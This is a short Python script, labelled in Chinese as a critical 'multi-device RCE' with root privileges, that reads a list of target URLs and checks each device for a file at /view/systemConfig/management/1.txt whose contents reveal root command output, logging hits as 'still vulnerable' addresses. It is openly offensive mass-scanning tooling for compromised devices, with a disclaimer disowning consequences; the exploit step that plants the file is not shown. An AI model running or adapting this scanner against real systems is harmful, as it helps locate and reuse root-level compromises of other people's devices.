##  name: 多设备通杀RCE
##  author: Pings
##  severity: critical
##  description: 多设备通杀代码执行，系统权限均为root

##任何因传播或利用本脚本造成的直接或间接后果及损失，均由使用者自行承担责任。作者对此概不负责。

import requests
import urllib3

requests.urllib3.disable_warnings()


def exp(url):
    try:
        res = requests.get(url + "/view/systemConfig/management/1.txt", verify=False, timeout=10)
        shell_url = url + '/view/systemConfig/management/1.txt'
        if 'root' in res.text:
            print(f'[+]存在漏洞:{shell_url}')
            try:
                with open('scan_txt_ok.txt', 'a') as f:
                    f.write('依旧存在漏洞的地址：' + shell_url + '\n')
            except Exception as e:
                print(f'[!]漏洞不存在或发生异常: {e}')
    except Exception as e:
        print(f'[!]发生异常: {e}')


def main():
    with open('url.txt', 'r') as f:
        resp = f.readlines()
        for url in resp:
            url = url.strip()
            if 'http' not in url:
                url = 'http://' + url
            exp(url)


if __name__ == '__main__':
    main()
